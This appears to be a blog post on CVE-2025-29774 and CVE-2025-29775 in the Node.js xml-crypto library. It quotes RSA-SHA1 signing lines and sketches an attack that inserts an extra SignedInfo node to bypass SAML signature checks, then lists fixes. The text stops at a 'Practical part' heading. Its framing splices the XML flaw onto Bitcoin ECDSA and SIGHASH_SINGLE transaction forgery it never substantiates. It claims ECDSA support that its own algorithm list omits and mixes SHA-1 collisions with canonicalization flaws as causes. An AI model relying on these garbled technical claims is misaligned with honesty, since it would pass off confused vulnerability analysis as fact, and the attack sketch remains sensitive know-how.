<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/063-1024x576.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/063-1024x576.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>In this article, we will look at the cryptographic attack of digital signature forgery (Digital Signature Forgery Attack), its consequences pose a threat to the security of transactions in the Bitcoin network, since digital signatures confirm the ownership and authorization of cryptocurrency transfers. We will consider examples of the impact of such attacks on Bitcoin based on modern research and identified vulnerabilities.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>A Digital&nbsp;Signature Forgery Attack&nbsp;is an attempt by an attacker to create a fake ECDSA digital signature that will be recognized as valid by the Bitcoin network. This attack allows transactions to be authorized without knowing the owner’s private key, which puts the security of funds in the BTC coin holder’s crypto wallet at risk.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->



---



* Tutorial: https://youtu.be/qbu1m_C1wyA
* Tutorial: https://cryptodeeptech.ru/digital-signature-forgery-attack
* Tutorial: https://dzen.ru/video/watch/68801dfc0c886621f7c1a0db
* Google Colab: https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW



---



<!-- wp:paragraph -->
<p>In cryptography, a digital signature provides confirmation of the authenticity of a message or transaction. Signature forgery means that it is possible to create a “RawTX” pair that will be accepted by the system as valid, although in fact it was not created by the owner of the private key. This opens the way for fraud, theft of funds and violation of the integrity of the blockchain. Digital Signature Forgery Attack (DSFA) as a cryptographic attack is implemented in software components that use the xml-crypto library to verify signatures of XML documents on the Node.js platform.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://youtu.be/qbu1m_C1wyA"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-7.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://youtu.be/qbu1m_C1wyA">https://youtu.be/qbu1m_C1wyA</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>First of all, this concerns enterprise integration solutions, cloud services and single sign-on systems, such as IBM App Connect Enterprise Certified Container and other applications that depend on xml-crypto for SAML authentication and authorization. Hardware vulnerabilities are not associated with specific physical devices, but are implemented in software products using the vulnerable library.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The vulnerabilities CVE-2025-29774 and CVE-2025-29775, known as the Digital Signature Forgery Attack, are implemented in the&nbsp;&nbsp;<strong>xml-crypto</strong>&nbsp;software library &nbsp;, a library for digitally signing and encrypting XML documents on the Node.js platform.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-1024x650.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-1024x650.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><a href="https://www.ibm.com/support/pages/security-bulletin-ibm-app-connect-enterprise-certified-container-operands-are-vulnerable-bypass-signature-validation-xml-data-cve-2025-29774-cve-2025-29775">Security Bulletin: IBM App Connect Enterprise Certified Container operands are vulnerable to bypass signature validation in XML data [CVE-2025-29774] [CVE-2025-29775]</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>IBM App Connect Enterprise Certified Container</strong>  is a data integration and processing software that uses xml-crypto to verify XML document signatures. The vulnerabilities allow digital signature verification to be bypassed, which leads to the possibility of forging and modifying signed messages, including SAML responses for authentication and authorization.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Systems and applications that use Node.js with the xml-crypto library</strong>  to verify signed XML messages, especially in the context of SAML authentication (e.g., enterprise portals, single sign-on systems, cloud services). The vulnerability allows an attacker to modify valid signed XML messages so that they pass signature verification, leading to authentication and authorization bypass, privilege escalation, and credential spoofing.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-1-1-1024x6.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-1-1-1024x6.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><a href="https://docs.retool.com/disclosures/samlstorm">Disclosure for CVE-2025-29774 and CVE-2025-29775 (SAMLStorm).</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The vulnerabilities are related to improper cryptographic signature verification in <strong><a href="https://github.com/keyhunters/xml-crypto">xml-crypto</a></strong> , specifically the handling of the DigestValue node, where an attacker can insert XML comments without breaking signature verification.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This allows critical identification and access control attributes in signed XML documents to be modified, resulting in the ability to bypass security without requiring credentials or access rights.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Thus, this code implements cryptographic signature and signature verification algorithms for various schemes (RSA with different SHA hashes and HMAC-SHA1), which allows them to be integrated into systems that require digital signature of data.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://github.com/keyhunters/xml-crypto/blob/master/src/signature-algorithms.ts">Critical vulnerability in signature-algorithms.ts code</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#critical-vulnerability-in-signature-algorithmsts-code"></a><a href="https://github.com/keyhunters/xml-crypto/blob/master/src/signature-algorithms.ts"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://github.com/keyhunters/xml-crypto/blob/master/src/signature-algorithms.ts">The signature-algorithms.ts</a>&nbsp;code&nbsp;is used to securely create and verify digital signatures, ensuring authenticity and integrity of data. ECDSA signatures provide authorship verification using a private key, and HMAC – integrity and authenticity verification using a secret key. The algorithms used comply with XML Digital Signature standards (the URIs of the algorithms point to W3C specifications).</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Thus,&nbsp;<a href="https://github.com/keyhunters/xml-crypto/blob/master/src/signature-algorithms.ts">the signature-algorithms.ts</a>&nbsp;code implements cryptographic signature and signature verification algorithms for various schemes (ECDSA, RSA with different SHA hashes and HMAC-SHA1), which allows them to be integrated into systems that require digital data signature.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Basic functionality</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#basic-functionality"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Each class implements an interface  <code>SignatureAlgorithm</code> and provides methods for:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Create Signature</strong>  ( <code>getSignature</code>): takes signature data and a private key, returns a digital signature in base64 format.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Signature checks</strong>  ( <code>verifySignature</code>): takes the input, public key and signature, returns a boolean value indicating whether the signature is correct.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>GetAlgorithmName</strong>  ( <code>getAlgorithmName</code>): Returns a URI identifying the signature algorithm used.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Supported algorithms</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#supported-algorithms"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>RsaSha1</strong>  – signature using RSA and the SHA-1 hash function.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>RsaSha256</strong>  – signature using RSA and SHA-256.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>RsaSha512</strong>  – signature using RSA and SHA-512.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>HmacSha1</strong>  – signature using HMAC based on SHA-1.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Technical details</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#technical-details"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>For RSA signatures, the class  <code>crypto.createSign</code> and  <code>crypto.createVerify</code> with the corresponding algorithms are used (“RSA-SHA1”, “RSA-SHA256”, “RSA-SHA512”).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>For HMAC signatures, it is used  <code>crypto.createHmac</code> with the “SHA1” algorithm.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Signatures are encoded in base64 for ease of transmission and storage.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The methods are wrapped in a function  <code>createOptionalCallbackFunction</code>, which probably allows them to be used with both callbacks and promises (details not in the code).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>The use of the RSA-SHA1</strong>&nbsp;algorithm&nbsp;in cryptographic signatures contains a vulnerability related to SHA-1 hash collisions. This allows an attacker to create two different messages with the same signature if he controls part of the data being signed.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Specifically, the problem is in the class&nbsp;<code>RsaSha1</code>:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>const signer = crypto.createSign("RSA-SHA1");  <em>// </em></strong>Vulnerable line</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-2-1002x102.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-2-1002x102.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><em><a href="https://github.com/keyhunters/xml-crypto/blob/9b91edf61cbc83853d824933be0dafa1f6114de4/src/signature-algorithms.ts#L7">signature-algorithms.ts#L7</a></em></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Also the second vulnerability is in the class&nbsp;<code>RsaSha1</code>:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>const verifier = crypto.createVerify("RSA-SHA1");  <em>// </em></strong>Vulnerable line</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-3-992x1024.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-3-992x1024.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/keyhunters/xml-crypto/blob/9b91edf61cbc83853d824933be0dafa1f6114de4/src/signature-algorithms.ts#L17">signature-algorithms.ts#L17</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://github.com/keyhunters/xml-crypto/blob/master/src/signature-algorithms.ts">Why does this critical collision attack allow creating different data with the same hash?</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#why-does-this-critical-collision-attack-allow-creating-different-data-with-the-same-hash"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>SHA-1 Collisions</strong> : The SHA-1 algorithm is no longer considered secure.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>RSA Context</strong> : When combined with RSA, this can lead to forged signatures on untrusted data (e.g. certificates or documents).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Recommendations</strong> : NIST and the security community recommend using SHA-256/SHA-512 over SHA-1.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Additional notes:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#additional-notes"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The (HMAC-SHA1) class <code>HmacSha1</code>is less vulnerable, but also obsolete. HMAC is more collision-resistant than “naked” SHA-1, but switching to SHA-256 is preferable.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The code contains modern implementations (RsaSha256/RsaSha512) that should be used instead of RsaSha1.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-4.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-4.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>CVE-2025-29774 and CVE-2025-29775 are critical vulnerabilities in the&nbsp;<strong>xml-crypto</strong>&nbsp;library for Node.js related to improper verification of digital signatures in XML documents. Both vulnerabilities allow an attacker to modify signed XML messages in a way that goes unnoticed by signature verification.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-cve-2025-29774--cve-2025-29775">Digital Signature Forgery Attack Mechanism</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#digital-signature-forgery-attack-mechanism"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1.&nbsp;<strong>Vulnerabilities in RSA-SHA1 algorithms</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1vulnerabilities-in-rsa-sha1-algorithms"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the provided&nbsp;<a href="https://github.com/keyhunters/xml-crypto/blob/master/src/signature-algorithms.ts">code,</a>&nbsp;the classes&nbsp;<code>RsaSha1</code>&nbsp;use the legacy&nbsp;<strong>RSA-SHA1</strong>&nbsp;algorithm for signing and verification:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>const signer = crypto.createSign("RSA-SHA1");  <em>// </em></strong>Vulnerable line<em> №7</em><strong>
const verifier = crypto.createVerify("RSA-SHA1");  <em>// </em></strong>Vulnerable line<em> №17</em></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>SHA1 is considered cryptographically insecure, the main problem lies in&nbsp;<strong>the logic of the library’s processing of XML structures</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>When creating a signature, the XML document goes through a <strong>canonicalization</strong> step (bringing it to a standard form, for example, removing spaces and comments).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>When verifying a signature, the library <strong>does not take into account the difference between canonicalized and non-canonicalized versions of a document</strong> . This allows an attacker to modify the document (e.g. add comments or change the structure) without breaking the signature.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2.&nbsp;<strong>Example of operation</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2example-of-operation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>SignedInfo modification</strong> :<ul><li><strong>The attacker adds additional nodes <code>&lt;SignedInfo></code></strong>  to the XML document , which results in an incorrect hash calculation during verification.</li></ul>xml<code>&lt;Signature> &lt;SignedInfo>...&lt;/SignedInfo> <em>&lt;!-- Original knot --></em> &lt;SignedInfo>...&lt;/SignedInfo> <em>&lt;!-- Added by an attacker --></em> &lt;/Signature></code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Using a weak algorithm</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The SHA1 algorithm is vulnerable to collisions, making it easy to create fake signatures for modified documents.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.&nbsp;<strong>Consequences</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3consequences"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Bypass authentication</strong> : Modifying attributes in SAML tokens or other access-related XML documents.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Privilege Escalation</strong> : Substituting a user ID for an administrator in the authorization system.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Mass Attacks</strong> : The vulnerability can be exploited remotely without user interaction (CVSS 9.3).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-7(1).png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-7(1).png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Technical details of the vulnerabilities:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#technical-details-of-the-vulnerabilities"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">CVE-2025-29774</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#cve-2025-29774"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Problem</strong> : Insufficient validation of XML document structure during signature verification.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Exploitation</strong> : Adding extra nodes or attributes to the signed part of the document.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">CVE-2025-29775</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#cve-2025-29775"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Issue</strong> : Incorrect use of canonicalization context when computing a hash.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Exploitation</strong> : Modification of a document in non-canonicalized form after signing.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Recommendations for troubleshooting</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#recommendations-for-troubleshooting"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Library update</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>For versions 2.x → 2.1.6, 3.x → 3.2.1, 6.x → 6.0.1.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Algorithm Replacement</strong> : typescript <code><em>// Usage SHA-256 / SHA-1</em> const signer = crypto.createSign("RSA-SHA256");</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Validating XML structure</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Check if there is exactly one node <code>&lt;SignedInfo></code> in the signature.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Addressing these vulnerabilities is critical for systems that use XML signatures for authentication (e.g. SAML, SOAP).</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-6-1024x825.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-6-1024x825.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>The xml-crypto</strong>&nbsp;library&nbsp;is widely used to verify digital signatures in XML messages, including protocols such as SAML, SOAP, and others. It follows that the vulnerability potentially affects:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Software and services that use xml-crypto for XML signatures</strong> , including enterprise integration platforms and middleware (such as IBM App Connect Enterprise, where these vulnerabilities were reported).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Devices and systems that use XML signatures for authentication and authorization, including servers and gateways that support SAML.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Vulnerabilities CVE-2025-29774 and CVE-2025-29775 primarily affect <strong>software components and platforms</strong> that use the xml-crypto library to process XML signatures.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Known victims include <strong>IBM App Connect Enterprise</strong> and likely other Node.js-based enterprise solutions using <a href="https://github.com/keyhunters/xml-crypto">xml-crypto</a> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>There is currently no public data on <strong>specific brands of hardware devices</strong> affected by these attacks.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>To assess the risk on specific devices, it is recommended to check whether they use vulnerable versions of xml-crypto or depend on similar XML signature mechanisms. For working with cryptocurrency wallets based on Node.js, IBM offers separate solutions, such as&nbsp;&nbsp;<strong>IBM Secure Bitcoin Wallet</strong>&nbsp;&nbsp;, an application based on Electrum Bitcoin Client that uses Node.js to interact with the Bitcoin network and manage the wallet.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In this solution, private keys and wallet can be stored and encrypted using IBM Cloud Hyper Protect Crypto Services (zHSM), which provides hardware-based secure storage of keys. Generation of private keys for Bitcoin wallets is usually implemented in specialized cryptographic libraries such as Electrum, bitcoinjs-lib, etc., which can be integrated into Node.js applications. IBM Secure Bitcoin Wallet uses a modified Electrum backend on Node.js for key and transaction management, through integration with IBM Cloud Hyper Protect Crypto Services, which provides hardware encryption and secure storage of private keys.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/digital-signature-forgery-attack">Practical part</a></h2>
